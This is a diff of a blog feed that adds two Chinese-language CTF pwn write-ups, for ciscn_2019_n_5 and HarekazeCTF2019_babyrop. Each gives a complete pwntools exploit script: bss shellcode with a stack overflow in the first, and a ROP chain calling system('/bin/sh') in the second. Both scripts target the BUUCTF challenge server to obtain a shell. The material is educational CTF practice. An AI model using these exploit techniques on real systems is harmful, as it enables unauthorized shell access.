@@ -5704,18 +5704,36 @@
 
 
 <h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>首先检查安全机制</p>
-<p><img src="buuctf-pwn1/image-20201103165102208.png" alt="image-20201103165102208"></p>
+<p><img src="image-20201103165102208.png" alt="image-20201103165102208"></p>
 <p>运行尝试一下</p>
-<p><img src="buuctf-pwn1/image-20201103165214264.png" alt="image-20201103165214264"></p>
+<p><img src="image-20201103165214264.png" alt="image-20201103165214264"></p>
 <p>反编译得到main函数代码</p>
-<p><img src="buuctf-pwn1/image-20201103165340664.png" alt="image-20201103165340664"></p>
+<p><img src="image-20201103165340664.png" alt="image-20201103165340664"></p>
 <p>text距离rbp有20h</p>
 <p>这里的name是位于bss段的</p>
-<p><img src="buuctf-pwn1/image-20201103170309603.png" alt="image-20201103170309603"></p>
+<p><img src="image-20201103170309603.png" alt="image-20201103170309603"></p>
 <p>第一个read读name的时候可以读到<code>0x64</code>的长度</p>
 <p>之后gets函数是读text，这里可以溢出rbp</p>
 <p>那么思路应该就是首先在第一个输入name的时候将shellcode输入到bss段</p>
 <p>之后使用gets函数溢出rbp，跳转到bss那里执行代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26740</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">payload1 = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_name = <span class="number">0x601080</span></span><br><span class="line">payload2 = <span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(bss_name)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="HarekazeCTF2019-babyrop"><a href="#HarekazeCTF2019-babyrop" class="headerlink" title="HarekazeCTF2019_babyrop"></a>HarekazeCTF2019_babyrop</h2><p>首先检查安全机制</p>
+<p><img src="image-20201105114634910.png" alt="image-20201105114634910"></p>
+<p>开启了NX，是64位的程序</p>
+<p>在IDA中反编译main函数</p>
+<p><img src="image-20201105114754145.png" alt="image-20201105114754145"></p>
+<p>输入了一个v4，之后输出，这里的scanf存在溢出</p>
+<p>数据段中存在一个后门字符串</p>
+<p><img src="image-20201105114914833.png" alt="image-20201105114914833"></p>
+<p>思路就是溢出返回地址，之后调用system函数</p>
+<p>payload还是比较简单的，和之前例子差不多</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25747</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = elf.sym[<span class="string">&#x27;binsh&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) +  p64(bin_sh) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是拿到shell之后发现flag居然不在根目录，少见</p>
+<p><img src="image-20201105120131498.png" alt="image-20201105120131498"></p>
 ]]></content>
       <categories>
         <category>buuctf</category>
